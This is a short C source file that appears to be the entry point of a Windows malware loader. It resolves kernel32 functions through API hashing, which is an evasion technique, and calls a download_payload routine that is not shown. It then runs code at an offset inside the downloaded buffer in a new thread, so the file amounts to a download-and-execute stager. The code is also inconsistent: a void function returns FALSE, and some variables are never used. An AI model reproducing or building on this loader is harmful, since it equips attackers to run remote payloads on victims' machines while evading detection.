#include "framework.h"
#include "api_hash.h"
#include "headers.h"
#include "ldr.h"
#include "misc.h"

extern LPVOID download_payload();
extern DWORD64 get_raw_and_size(const char *pebase);

void entrypoint()
{


	HMODULE hm_kernel32 = GMHR_Hash(HASH_KERNEL32);

	fnCreateThread func_CreateThread = NULL;
	fnLoadLibraryA func_LoadLibraryA = NULL;
	if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR_Hash(hm_kernel32, HASH_LOADLIBRARYA)) == NULL)
		return;
	if ((func_CreateThread = (fnCreateThread)GPAR_Hash(hm_kernel32, HASH_CREATETHREAD)) == NULL)
		return FALSE;

	LPVOID buffer = download_payload();
	DWORD64 func_info = get_raw_and_size(buffer);

	LPVOID func_ptr = (LPVOID)((UINT64)buffer + (DWORD)(func_info & 0xFFFFFFFF));
	DWORD func_size = (DWORD)(func_info >> 32);

	DWORD thread_id = 0;
	HANDLE thread = 0;
	thread = func_CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(func_ptr), 0, 0, NULL);
	if (thread == NULL)
		return FALSE;
}
